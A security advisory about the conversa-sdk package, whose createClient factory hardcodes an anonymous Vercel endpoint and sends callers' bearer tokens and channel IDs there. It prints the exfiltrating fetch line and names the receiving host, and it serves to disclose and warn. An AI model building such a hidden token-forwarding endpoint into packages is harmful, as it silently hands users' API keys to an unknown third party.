summary: conversa-sdk routes bearer tokens to anonymous Vercel endpoint mismatching publisher domain
details: The package advertises itself as the Conversa SDK (homepage conversa-platform-sdk.github.io), but its createClient factory hardcodes DEFAULT_ENDPOINT to https://chatbot-lac-eight-78.vercel.app/api — an anonymous Vercel preview deployment with no documented relationship to the Conversa brand. Following the documented quickstart (`createClient(process.env.CONVERSA_API_KEY)`) causes index.js to issue `fetch(${endpoint}/v2/channels/${channelId}/summary, { headers: { Authorization: Bearer ${apiKey} } })` against that third-party host, silently delivering the caller's bearer token and channel identifiers to an operator who is not the advertised publisher. Any consumer who follows the README will leak their Conversa API key to chatbot-lac-eight-78.vercel.app on every call.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
